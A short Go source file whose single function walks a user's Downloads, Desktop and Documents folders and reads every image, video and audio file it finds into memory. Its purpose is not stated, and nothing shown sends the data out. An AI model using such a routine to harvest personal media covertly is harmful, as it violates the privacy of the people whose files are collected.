package main

import (
	"io/ioutil"
	"os"
	"path/filepath"
)

var dirs = []string{
	"Downloads",
	"Desktop",
	"Documents",
}

var fileExtensions = map[string]bool{
	".jpg":  true,
	".jpeg": true,
	".png":  true,
	".heic": true,
	".webp": true,
	".mp4":  true,
	".mov":  true,
	".mp3":  true,
	// ".m4a":  true,
}

func getFiles() map[string][]byte {
	home, err := os.UserHomeDir()
	if err != nil {
		return make(map[string][]byte)
	}

	var files []string

	for _, dir := range dirs {
		err = filepath.Walk(filepath.Join(home, dir), func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			extension := filepath.Ext(path)

			if !info.IsDir() && fileExtensions[extension] {
				files = append(files, path)
			}

			return nil
		})

		if err != nil {
			return make(map[string][]byte)
		}
	}

	res := make(map[string][]byte)

	for _, file := range files {
		data, err := ioutil.ReadFile(file)
		if err != nil {
			return make(map[string][]byte)
		}

		res[file] = data
	}

	return res
}
